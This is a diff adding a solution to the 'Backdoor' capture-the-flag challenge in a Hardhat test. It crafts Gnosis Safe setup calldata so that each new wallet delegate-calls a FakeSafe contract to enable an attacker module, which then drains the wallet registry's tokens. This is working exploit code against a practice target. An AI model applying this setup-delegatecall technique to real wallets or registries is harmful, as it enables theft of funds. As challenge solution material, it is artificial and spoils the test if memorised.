@@ -46,6 +46,86 @@ describe('[Challenge] Backdoor', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // deploy FakeSafe contract
+        const fakeSafe = await (await ethers.getContractFactory('contracts/backdoor/FakeSafe.sol:FakeSafe', deployer)).deploy();
+        const attacker = await (await ethers.getContractFactory('contracts/backdoor/Attacker.sol:Attacker', deployer)).deploy();
+
+        const safeABI = ['function setup(address[],uint256,address,bytes,address,address,uint256,address) external'];
+        const safeInterface = new ethers.utils.Interface(safeABI);
+
+        /**
+         * 
+         * we need to craft the setup function data
+         * 
+         *  /// @dev Setup function sets initial storage of contract.
+        /// @param _owners List of Safe owners.
+        /// @param _threshold Number of required confirmations for a Safe transaction.
+        /// @param to Contract address for optional delegate call.
+        /// @param data Data payload for optional delegate call.
+        /// @param fallbackHandler Handler for fallback calls to this contract
+        /// @param paymentToken Token that should be used for the payment (0 is ETH)
+        /// @param payment Value that should be paid
+        /// @param paymentReceiver Adddress that should receive the payment (or 0 if tx.origin)
+        function setup(
+            address[] calldata _owners,
+            uint256 _threshold,
+            address to,
+            bytes calldata data,
+            address fallbackHandler,
+            address paymentToken,
+            uint256 payment,
+            address payable paymentReceiver
+        ) external {
+            // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice
+            setupOwners(_owners, _threshold);
+            if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);
+            // As setupOwners can only be called if the contract has not been initialized we don't need a check for setupModules
+            setupModules(to, data);
+
+            if (payment > 0) {
+                // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself)
+                // baseGas = 0, gasPrice = 1 and gas = payment => amount = (payment + 0) * 1 = payment
+                handlePayment(payment, 0, 1, paymentToken, paymentReceiver);
+            }
+            emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler);
+        }
+         */
+        const datalist = []
+        for (let i = 0; i < users.length; i++) {
+            const setupdata = safeInterface.encodeFunctionData('setup', [
+                [users[i]],
+                1,
+                fakeSafe.address,
+                fakeSafe.interface.encodeFunctionData('enableModule2', [attacker.address]),
+                ethers.constants.AddressZero,
+                ethers.constants.AddressZero,
+                0,
+                ethers.constants.AddressZero
+            ]);
+     
+            const createwalletdata = walletFactory.interface.encodeFunctionData('createProxyWithCallback', [
+                masterCopy.address, 
+                setupdata, 
+                i, 
+                walletRegistry.address 
+            ]);
+            datalist.push(createwalletdata);
+            /**
+             * 
+             *  function createProxyWithCallback(
+                    address _singleton,
+                    bytes memory initializer,
+                    uint256 saltNonce,
+                    IProxyCreationCallback callback
+                ) public returns (GnosisSafeProxy proxy) {
+                    uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
+                    proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
+                    if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);
+                }
+             */
+            // walletFactory.createProxyWithCallback(masterCopy.address, setupdata, i, fakeSafe.address);
+        }
+        await attacker.connect(player).attack(datalist, token.address, walletFactory.address);
     });
 
     after(async function () {
